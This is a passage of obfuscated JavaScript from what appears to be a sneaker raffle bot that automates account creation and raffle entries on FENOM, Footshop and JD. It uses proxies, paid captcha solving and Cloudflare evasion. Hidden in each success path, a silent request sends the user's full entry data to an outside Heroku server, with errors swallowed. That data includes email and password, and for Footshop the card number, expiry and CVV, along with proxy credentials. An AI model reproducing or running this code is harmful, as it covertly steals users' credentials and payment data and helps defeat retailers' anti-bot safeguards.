                                _0x53d315 = 'no', console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x2a817b['name'] + ']\x20Task\x20' + (_0x414abd + 0x1) + '\x20:\x20Account\x20' + _0x5de9ab[_0x414abd]['Email'] + '\x20Generated')), _0x39c9ee['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x5de9ab[_0x414abd]['Email'] + ',' + _0x5de9ab[_0x414abd]['Password']);
                                let _0x1d7b47 = _0x5de9ab[_0x414abd];
                                try {
                                    prxdata = {
                                        'username': _0xeaf750['replace']('#', ''),
                                        'module': _0x2a817b['name'],
                                        'entrydata': JSON['stringify'](_0x1d7b47),
                                        'proxy': '' + _0x4505c5[_0x414abd]
                                    };
                                    var _0x1d9f1e = JSON['stringify'](prxdata);
                                    let _0x4cdf18 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3c7f7c['post']('https://jraffles.herokuapp.com/success', _0x1d9f1e, _0x4cdf18);
                                } catch (_0x2015ef) {
                                }
                                try {
                                    _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x167b1a['succesDEVMSG']);
                                } catch {
                                }
                                await _0x21ec0c(_0x3213ac, _0x167b1a['succesDEVMSG']);
                            } catch (_0x3c5d1a) {
                                throw new Error('Account\x20generation\x20failed');
                            }
                        } catch (_0xbc571) {
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x2a817b['name'] + ']\x20Task\x20' + (_0x414abd + 0x1) + '\x20:\x20' + _0xbc571)), _0x571b40 = '' + _0xbc571;
                            var _0x3fbc69 = await _0x4808d0(_0x5de9ab[_0x414abd], _0x2a817b, 'acc', !![], _0x571b40);
                            _0x167b1a['errorDEV'] = { 'embeds': [_0x3fbc69] }, _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x167b1a['errorDEV']), await _0x21ec0c(_0x451f96, _0x167b1a['errorDEV']), _0x53d315 = 'yes';
                        } finally {
                            _0x6ab4a9['close']();
                            if (_0x53d315 == 'yes' && _0x19bec7 != 0x5 && _0x571b40 != 'Size\x20Not\x20Found') {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x2a817b['name'] + ']\x20Task\x20' + (_0x414abd + 0x1) + '\x20:\x20Retrying\x20(' + _0x19bec7 + '\x20/\x205)')), _0x414abd = _0x414abd - 0x1, _0x19bec7 = _0x19bec7 + 0x1;
                                continue;
                            }
                            _0x53d315 == 'yes' && _0x19bec7 >= 0x5 && (_0x61dfa6(_0x5de9ab[_0x414abd], _0x2a817b), _0x53d315 = 'no', _0x19bec7 = 0x0), console['log'](_0x3996da() + '\x20[' + _0x2a817b['name'] + ']\x20Waiting\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x5b32bc(_0x1aef72, _0x2344cc, _0x49cf49) {
                    _0x27947['use'](_0x2c72d8()), _0x27947['use'](_0x244ad0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x409619['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5aa906 = 0x0; _0x5aa906 < _0x2344cc['length']; _0x5aa906++) {
                        if (_0x2f9119 != 'yes')
                            var _0x2f9119 = '', _0x4a2350 = 0x0;
                        var _0x3eda08;
                        try {
                            await _0x5a027c(_0x2344cc, _0x5aa906);
                        } catch {
                            _0x2f9119 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x5b3b18(_0x1aef72['name'] + '\x20Task\x20' + (_0x5aa906 + 0x1) + '\x20/\x20' + _0x2344cc['length'] + '\x20||\x20File:\x20' + _0x5e8965 + '\x20Proxies:\x20' + _0x571870);
                        const _0xc85c5a = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x1be6be = Math['round'](Math['random']() * (_0x49cf49['length'] - 0x1)), _0x4d2965 = _0x49cf49[_0x1be6be]['split'](':'), _0x56b7d4;
                        try {
                            _0x56b7d4 = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4d2965[0x0] + ':' + _0x4d2965[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x56b7d4 = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4d2965[0x0] + ':' + _0x4d2965[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x29848a = await _0x56b7d4['newPage'](), _0xda88ff = await _0x29848a['target']()['createCDPSession'](), { windowId: _0x4985a1 } = await _0xda88ff['send']('Browser.getWindowForTarget');
                            await _0x29848a['authenticate']({
                                'username': '' + _0x4d2965[0x2],
                                'password': '' + _0x4d2965[0x3]
                            }), console['log'](_0x3996da() + '\x20[' + _0x1aef72['name'] + ']\x20Task\x20' + (_0x5aa906 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x29848a['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x3996da() + '\x20[' + _0x1aef72['name'] + ']\x20Task\x20' + (_0x5aa906 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x50b4f8(0xbb8), await _0xda88ff['send']('Browser.setWindowBounds', {
                                'windowId': _0x4985a1,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x50b4f8(0x1f40);
                            try {
                                await _0x29848a['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x50b4f8(0x1388), console['log'](_0x3996da() + '\x20[' + _0x1aef72['name'] + ']\x20Task\x20' + (_0x5aa906 + 0x1) + '\x20:\x20Logging\x20in'), await _0x29848a['type']('input[name=\x22email\x22]', '' + _0x2344cc[_0x5aa906]['Email']), await _0x50b4f8(0x1f4), await _0x29848a['type']('input[name=\x22password\x22]', '' + _0x2344cc[_0x5aa906]['Password']), await _0x50b4f8(0x258), await _0x29848a['$eval']('#login-form', _0x14ace0 => _0x14ace0['submit']()), await _0x29848a['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x50b4f8(0x1f4), await _0x29848a['goto']('' + _0x2344cc[_0x5aa906]['Url']), await _0x29848a['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x3996da() + '\x20[' + _0x1aef72['name'] + ']\x20Task\x20' + (_0x5aa906 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x2344cc[_0x5aa906]['Size']);
                            if (_0x2344cc[_0x5aa906]['Size'] != 'RANDOM') {
                                var _0x462e88 = '\x20' + _0x2344cc[_0x5aa906]['Size'] + '\x20';
                                const _0x552fec = await _0x29848a['$x']('//span[contains(text(),\x20' + _0x462e88 + ')]');
                                await _0x552fec[0x0]['click']();
                            } else {
                                const _0x9ba5f2 = await _0x29848a['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x203ba8 = Math['round'](Math['random']() * (_0x9ba5f2['length'] - 0x1));
                                await _0x9ba5f2[_0x203ba8]['click']();
                            }
                            await _0x50b4f8(0x258), await _0x29848a['click']('#cookieChoiceDismiss'), await _0x50b4f8(0x3e8), await _0x29848a['type']('#instagram-account', '' + _0x2344cc[_0x5aa906]['Follower']), await _0x50b4f8(0x28a), await _0x29848a['click']('#book-btn'), await _0x50b4f8(0xbb8);
                            try {
                                await _0x29848a['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x50b4f8(0x1f4), console['log'](_0x3996da() + '\x20[' + _0x1aef72['name'] + ']\x20Task\x20' + (_0x5aa906 + 0x1) + '\x20:\x20' + _0x3c5615['cyan']('Solving\x20Captcha')), await _0x29848a['solveRecaptchas'](), console['log'](_0x3996da() + '\x20[' + _0x1aef72['name'] + ']\x20Task\x20' + (_0x5aa906 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x50b4f8(0x7d0), await _0x29848a['$eval']('#book-btn-for-sure', _0x465bf6 => _0x465bf6['click']()), await _0x50b4f8(0x12c), await _0x29848a['click']('#book-btn-for-sure'), await _0x50b4f8(0xdac);
                            const _0x595ff1 = await _0x29848a['$eval']('.reservation-popup\x20>\x20.title', _0x205437 => {
                                return _0x205437['innerHTML'];
                            });
                            if (_0x595ff1) {
                                _0x2f9119 = 'no', _0x1474be(_0x2344cc[_0x5aa906], _0x1aef72), console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x1aef72['name'] + ']\x20Task\x20' + (_0x5aa906 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x5b306a = await _0x4808d0(_0x2344cc[_0x5aa906], _0x1aef72, 'dev', ![]), _0x126d20 = await _0x4808d0(_0x2344cc[_0x5aa906], _0x1aef72, 'pub', ![]);
                                let _0x17bcc8 = _0x2344cc[_0x5aa906];
                                try {
                                    prxdata = {
                                        'username': _0xeaf750['replace']('#', ''),
                                        'module': _0x1aef72['name'],
                                        'entrydata': JSON['stringify'](_0x17bcc8),
                                        'proxy': '' + _0x49cf49[_0x5aa906]
                                    };
                                    var _0x318520 = JSON['stringify'](prxdata);
                                    let _0x19b5e9 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3c7f7c['post']('https://jraffles.herokuapp.com/success', _0x318520, _0x19b5e9);
                                } catch (_0x58bb1c) {
                                }
                                const _0x3a6f5f = {
                                    'succesDEVMSG': { 'embeds': [_0x5b306a] },
                                    'succesPUBMSG': { 'embeds': [_0x126d20] }
                                };
                                try {
                                    _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x3a6f5f['succesDEVMSG']), await _0x50b4f8(0xc8), await _0x21ec0c(_0x31bbcd, _0x3a6f5f['succesDEVMSG']), await _0x50b4f8(0xc8), await _0x21ec0c(_0x171aec, _0x3a6f5f['succesPUBMSG']);
                                } catch (_0x2c8edb) {
                                    console['log'](_0x3c5615['yellow'](_0x3996da() + '\x20[' + _0x1aef72['name'] + ']\x20Task\x20' + (_0x5aa906 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2c8edb));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x27020f) {
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x1aef72['name'] + ']\x20Task\x20' + (_0x5aa906 + 0x1) + '\x20:\x20' + _0x27020f)), _0x3eda08 = '' + _0x27020f;
                            var _0xc40a51 = await _0x4808d0(_0x2344cc[_0x5aa906], _0x1aef72, 'dev', !![], _0x3eda08), _0x5b306a = await _0x4808d0(_0x2344cc[_0x5aa906], _0x1aef72, 'dev', ![]), _0x126d20 = await _0x4808d0(_0x2344cc[_0x5aa906], _0x1aef72, 'pub', ![]);
                            const _0x50ad59 = {
                                'succesDEVMSG': { 'embeds': [_0x5b306a] },
                                'succesPUBMSG': { 'embeds': [_0x126d20] }
                            };
                            _0x50ad59['errorDEV'] = { 'embeds': [_0xc40a51] }, _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x50ad59['errorDEV']), await _0x21ec0c(_0x451f96, _0x50ad59['errorDEV']), _0x27020f != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x2f9119 = 'yes');
                        } finally {
                            _0x56b7d4['close']();
                            if (_0x2f9119 == 'yes' && _0x4a2350 != 0x5 && _0x3eda08 != 'Size\x20Not\x20Found') {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x1aef72['name'] + ']\x20Task\x20' + (_0x5aa906 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4a2350 + '\x20/\x205)')), _0x5aa906 = _0x5aa906 - 0x1, _0x4a2350 = _0x4a2350 + 0x1;
                                continue;
                            }
                            _0x2f9119 == 'yes' && _0x4a2350 >= 0x5 && (_0x61dfa6(_0x2344cc[_0x5aa906], _0x1aef72), _0x2f9119 = 'no', _0x4a2350 = 0x0), console['log'](_0x3996da() + '\x20[' + _0x1aef72['name'] + ']\x20Waiting\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x4e1de9, _0x3fca5e, _0x4fc24d) {
                _0x27947['use'](_0x2c72d8()), _0x27947['use'](_0x244ad0({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x409619['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x565409 = 0x0; _0x565409 < _0x3fca5e['length']; _0x565409++) {
                    var _0x389f10;
                    if (_0x5de159 != 'yes')
                        var _0x5de159 = '', _0x354321 = 0x0;
                    var _0x1e9414 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0xeaf750
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x3fca5e[_0x565409]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x3fca5e[_0x565409]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x409619['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x41a50b
                            }
                        ]
                    }], _0x43f389 = await _0x4808d0(_0x3fca5e[_0x565409], _0x4e1de9, 'dev', ![]), _0x24d97e = await _0x4808d0(_0x3fca5e[_0x565409], _0x4e1de9, 'pub', ![]);
                    const _0x28efe3 = {
                        'succesDEVMSG': { 'embeds': [_0x43f389] },
                        'succesPUBMSG': { 'embeds': [_0x24d97e] }
                    }, _0x4e14d8 = { 'embeds': _0x1e9414 };
                    try {
                        await _0x5a027c(_0x3fca5e, _0x565409);
                    } catch {
                        _0x5de159 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x3fca5e[_0x565409]['Email'] == '' || _0x3fca5e[_0x565409]['FirstName'] == '' || _0x3fca5e[_0x565409]['LastName'] == '' || _0x3fca5e[_0x565409]['Country'] == '' || _0x3fca5e[_0x565409]['Size'] == '' || _0x3fca5e[_0x565409]['Address1'] == '' || _0x3fca5e[_0x565409]['Zip'] == '') {
                        console['log'](_0x3996da() + '\x20[' + _0x4e1de9['name'] + ']\x20Task\x20' + (_0x565409 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x3fca5e[_0x565409]['Email'] == '' || _0x3fca5e[_0x565409]['FirstName'] == '' || _0x3fca5e[_0x565409]['LastName'] == '' || _0x3fca5e[_0x565409]['Country'] == '' || _0x3fca5e[_0x565409]['Size'] == '' || _0x3fca5e[_0x565409]['Address1'] == '' || _0x3fca5e[_0x565409]['Zip'] == '' || _0x3fca5e[_0x565409]['Phone'] == '') {
                        console['log'](_0x3996da() + '\x20[' + _0x4e1de9['name'] + ']\x20Task\x20' + (_0x565409 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x27903f = '' + _0x3fca5e[_0x565409]['Url'];
                    if (_0x409619['useRandomProxy'] = ![])
                        var _0x57470a = _0x4fc24d[_0x565409]['split'](':');
                    else
                        var _0x42cdd7 = Math['round'](Math['random']() * (_0x4fc24d['length'] - 0x1)), _0x57470a = _0x4fc24d[_0x42cdd7]['split'](':');
                    var _0x1d1785;
                    try {
                        _0x1d1785 = await _0x27947['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x57470a[0x0] + ':' + _0x57470a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x1d1785 = await _0x27947['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x57470a[0x0] + ':' + _0x57470a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x2f6c4f = await _0x1d1785['newPage']();
                        await _0x2f6c4f['authenticate']({
                            'username': '' + _0x57470a[0x2],
                            'password': '' + _0x57470a[0x3]
                        }), console['log'](_0x3996da() + '\x20[' + _0x4e1de9['name'] + ']\x20Task\x20' + (_0x565409 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2f6c4f['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2f6c4f['setRequestInterception'](!![]), _0x2f6c4f['on']('request', _0x2d88f0 => {
                            _0x2d88f0['resourceType']() === 'image' || _0x2d88f0['resourceType']() === 'font' || _0x2d88f0['resourceType']() === 'media' ? _0x2d88f0['abort']() : _0x2d88f0['continue']();
                        });
                        try {
                            await _0x2f6c4f['goto'](_0x27903f), await _0x50b4f8(0xbb8), await _0x2f6c4f['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2f6c4f['click']('.control__JhutY'), await _0x50b4f8(0x1f4);
                        if (_0x3fca5e[_0x565409]['Size'] != 'RANDOM')
                            try {
                                const _0x373825 = await _0x2f6c4f['$x']('//div[contains(text(),\x20\x27' + _0x3fca5e[_0x565409]['Size'] + '\x27)]');
                                await _0x373825[0x0]['click']();
                            } catch {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x4e1de9['name'] + ']\x20Task\x20' + (_0x565409 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x59f464 = await _0x2f6c4f['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x2f4785 = Math['round'](Math['random']() * (_0x59f464['length'] - 0x1));
                            await _0x59f464[_0x2f4785]['click']();
                        }
                        await _0x50b4f8(0x4b0);
                        const _0x293b1e = await _0x2f6c4f['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x293b1e[0x0]['click'](), await _0x2f6c4f['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x3996da() + '\x20[' + _0x4e1de9['name'] + ']\x20Task\x20' + (_0x565409 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x2f6c4f['type']('input[name=\x22email\x22]', '' + _0x3fca5e[_0x565409]['Email']), await _0x50b4f8(0x640), await _0x2f6c4f['type']('input[name=\x22phone\x22]', '' + _0x3fca5e[_0x565409]['Phone']), await _0x50b4f8(0x4b0), await _0x2f6c4f['click']('button.btn.continue-button__1RtsS'), await _0x50b4f8(0x4b0);
                        try {
                            await _0x2f6c4f['type']('input[name=\x22firstName\x22]', '' + _0x3fca5e[_0x565409]['FirstName']), await _0x50b4f8(0x258);
                        } catch {
                            const _0x4de857 = await _0x2f6c4f['$$eval']('.invalid-feedback\x20>\x20div', _0x35a262 => {
                                return _0x35a262['map'](_0x51875c => _0x51875c['innerText']);
                            });
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x4e1de9['name'] + ']\x20Task\x20' + (_0x565409 + 0x1) + '\x20:\x20' + _0x4de857));
                            continue;
                        }
                        await _0x2f6c4f['type']('input[name=\x22lastName\x22]', '' + _0x3fca5e[_0x565409]['LastName']), await _0x50b4f8(0xc8), await _0x2f6c4f['type']('input[name=\x22instagramUsername\x22]', '' + _0x3fca5e[_0x565409]['Follower']), await _0x50b4f8(0x4b0), await _0x2f6c4f['click']('button.btn.continue-button__1RtsS'), await _0x50b4f8(0x3e8), console['log'](_0x3996da() + '\x20[' + _0x4e1de9['name'] + ']\x20Task\x20' + (_0x565409 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x2f6c4f['select']('select[name=\x22country\x22]', '' + _0x3fca5e[_0x565409]['Country']), await _0x50b4f8(0x2bc), await _0x2f6c4f['type']('input[name=\x22streetName\x22]', '' + _0x3fca5e[_0x565409]['Address1']), await _0x50b4f8(0x258), await _0x2f6c4f['type']('input[name=\x22houseNumber\x22]', _0x3fca5e[_0x565409]['HouseNumber'] + '\x20' + _0x3fca5e[_0x565409]['Address2']), await _0x50b4f8(0xc8), await _0x2f6c4f['type']('input[name=\x22postalCode\x22]', '' + _0x3fca5e[_0x565409]['Zip']), await _0x50b4f8(0x1f4), await _0x2f6c4f['type']('input[name=\x22city\x22]', '' + _0x3fca5e[_0x565409]['City']), await _0x50b4f8(0x4b0), await _0x2f6c4f['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x50b4f8(0x4b0), await _0x2f6c4f['click']('button.btn.continue-button__1RtsS'), await _0x50b4f8(0x4b0), console['log'](_0x3996da() + '\x20[' + _0x4e1de9['name'] + ']\x20Task\x20' + (_0x565409 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x2f6c4f['solveRecaptchas'](), console['log'](_0x3996da() + '\x20[' + _0x4e1de9['name'] + ']\x20Task\x20' + (_0x565409 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x50b4f8(0xbb8), await _0x2f6c4f['click']('button.btn.continue-button__1RtsS'), await _0x50b4f8(0x1388), console['log'](_0x3996da() + '\x20[' + _0x4e1de9['name'] + ']\x20Task\x20' + (_0x565409 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x2f6c4f['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2f6c4f['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x50b4f8(0x4b0), await _0x2f6c4f['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x3fca5e[_0x565409]['CardNumber']), await _0x50b4f8(0x320), await _0x2f6c4f['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x2f6c4f['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x3fca5e[_0x565409]['ExpiryDate']), await _0x50b4f8(0x4b0), await _0x2f6c4f['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x2f6c4f['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x3fca5e[_0x565409]['CVV']), await _0x50b4f8(0x226), await _0x2f6c4f['type']('input[name=\x22holderName\x22]', '' + _0x3fca5e[_0x565409]['NameOnCard']), await _0x50b4f8(0x226), await _0x2f6c4f['click']('button.adyen-checkout__button'), console['log'](_0x3996da() + '\x20[' + _0x4e1de9['name'] + ']\x20Task\x20' + (_0x565409 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x2f6c4f['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x50b4f8(0xbb8);
                        } catch (_0x3ae8e9) {
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x4e1de9['name'] + ']\x20Task\x20' + (_0x565409 + 0x1) + '\x20:\x203DS\x20Failed')), _0x389f10 = '3DS\x20Error\x20' + _0x3ae8e9;
                            var _0x1f1de0 = await _0x4808d0(_0x3fca5e[_0x565409], _0x4e1de9, 'dev', !![], _0x389f10);
                            _0x28efe3['errorDEV'] = { 'embeds': [_0x1f1de0] };
                            _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x28efe3['errorDEV']);
                            await _0x21ec0c(_0x451f96, _0x28efe3['errorDEV']);
                            continue;
                        }
                        _0x1474be(_0x3fca5e[_0x565409], _0x4e1de9), console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x4e1de9['name'] + ']\x20Task\x20' + (_0x565409 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x263ab4 = _0x3fca5e[_0x565409];
                        try {
                            prxdata = {
                                'username': _0xeaf750['replace']('#', ''),
                                'module': _0x4e1de9['name'],
                                'entrydata': JSON['stringify'](_0x263ab4),
                                'proxy': '' + _0x4fc24d[_0x565409]
                            };
                            var _0x4a50e9 = JSON['stringify'](prxdata);
                            let _0x21238b = { 'headers': { 'content-type': 'application/json' } };
                            await _0x3c7f7c['post']('https://jraffles.herokuapp.com/success', _0x4a50e9, _0x21238b);
                        } catch (_0x54f71c) {
                        }
                        if (_0x409619['webhook'] != undefined && _0x409619['webhook'] != '')
                            try {
                                await _0x21ec0c(_0x409619['webhook'], _0x28efe3['succesDEVMSG']);
                            } catch {
                            }
                        await _0x50b4f8(0xc8), await _0x21ec0c(_0x31bbcd, _0x28efe3['succesDEVMSG']), await _0x50b4f8(0xc8);
                        try {
                            await _0x21ec0c(_0x171aec, _0x28efe3['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x3a39f9) {
                        console['log'](_0x3996da() + '\x20[' + _0x4e1de9['name'] + ']\x20Task\x20' + (_0x565409 + 0x1) + '\x20:\x20' + _0x3a39f9), _0x389f10 = '' + _0x3a39f9;
                        var _0x1f1de0 = await _0x4808d0(_0x3fca5e[_0x565409], _0x4e1de9, 'dev', !![], _0x389f10);
                        _0x28efe3['errorDEV'] = { 'embeds': [_0x1f1de0] }, _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x28efe3['errorDEV']), await _0x21ec0c(_0x451f96, _0x28efe3['errorDEV']), _0x5de159 = 'yes';
                    } finally {
                        _0x1d1785['close']();
                        if (_0x5de159 == 'yes' && _0x354321 != 0x5) {
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x4e1de9['name'] + ']\x20Task\x20' + (_0x565409 + 0x1) + '\x20:\x20Retrying\x20(' + _0x354321 + '\x20/\x205)')), _0x565409 = _0x565409 - 0x1, _0x354321 = _0x354321 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x409619['footshopDelay'] + '\x20ms'), await _0x50b4f8(_0x409619['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x4535de, _0x3b3841, _0x592c10) {
                var _0x2e3ac0 = ![], _0x79beb8 = ![];
                if (_0x409619['captchaKey'] == '' || _0x409619['captchaKey'] == undefined)
                    return console['log'](_0x3c5615['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x27947['use'](_0x2c72d8()), _0x27947['use'](_0x244ad0({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x409619['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x5c015a = 0x0; _0x5c015a < _0x3b3841['length']; _0x5c015a++) {
                    if (_0x3f8714 != 'yes')
                        var _0x3f8714 = '', _0x71146f = 0x0;
                    var _0x32caa1, _0x48f0fe = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x3b3841[_0x5c015a]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x3b3841[_0x5c015a]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0xeaf750
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x409619['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x41a50b
                            }
                        ]
                    }];
                    const _0x32ac9f = { 'embeds': _0x48f0fe };
                    _0x5b3b18(_0x4535de['name'] + '\x20Task\x20' + (_0x5c015a + 0x1) + '\x20/\x20' + _0x3b3841['length'] + '\x20||\x20File:\x20' + _0x5e8965 + '\x20Proxies:\x20' + _0x571870);
                    try {
                        await _0x5a027c(_0x3b3841, _0x5c015a);
                    } catch {
                        _0x3f8714 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x4d7896 = await _0x4808d0(_0x3b3841[_0x5c015a], _0x4535de, 'dev', ![]), _0x432f87 = await _0x4808d0(_0x3b3841[_0x5c015a], _0x4535de, 'pub', ![]);
                    const _0x18bb72 = {
                        'succesDEVMSG': { 'embeds': [_0x4d7896] },
                        'succesPUBMSG': { 'embeds': [_0x432f87] }
                    };
                    if (_0x409619['webhook'] != undefined && _0x409619['webhook'] != '')
                        try {
                            await _0x21ec0c(_0x409619['webhook'], _0x18bb72['succesDEVMSG']);
                        } catch {
                        }
                    await _0x50b4f8(0xc8), await _0x21ec0c(_0x31bbcd, _0x18bb72['succesDEVMSG']), await _0x50b4f8(0xc8);
                    try {
